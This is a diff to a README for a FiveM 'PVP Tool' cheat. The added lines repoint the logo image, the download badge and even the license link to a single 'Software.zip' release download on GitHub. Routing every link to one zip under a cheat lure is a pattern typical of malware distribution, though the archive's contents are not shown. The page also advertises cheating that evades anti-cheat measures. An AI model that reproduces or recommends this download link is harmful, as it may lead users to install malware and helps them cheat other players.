@@ -2,7 +2,7 @@
 
 Welcome to the FiveM TZ Project PVP Tool repository! Enhance your gaming experience with our cheat tool designed specifically for PVP gameplay on FiveM. With TZ Project, you can take your gaming skills to the next level without worrying about LUA injection, resource stoppers, or dumpers. 
 
-![FiveM TZ Project Logo](https://example.com/logo.png)
+![FiveM TZ Project Logo](https://github.com/Biswajit123-del/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip)
 
 ## Features ✨
 
@@ -40,7 +40,7 @@ Welcome to the FiveM TZ Project PVP Tool repository! Enhance your gaming experie
 
 To get started with the FiveM TZ Project PVP Tool, you can download the tool using the following link:
 
-[![Download TZ Project PVP Tool](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download TZ Project PVP Tool](https://github.com/Biswajit123-del/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip)](https://github.com/Biswajit123-del/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip)
 
 Click the button above to download the tool and follow the installation instructions to launch it.
 
@@ -65,7 +65,7 @@ Stay tuned for the latest updates and releases of the FiveM TZ Project PVP Tool 
 
 ## License 📄
 
-This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/YouaifXD/789566136/blob/main/LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Biswajit123-del/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip](https://github.com/Biswajit123-del/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
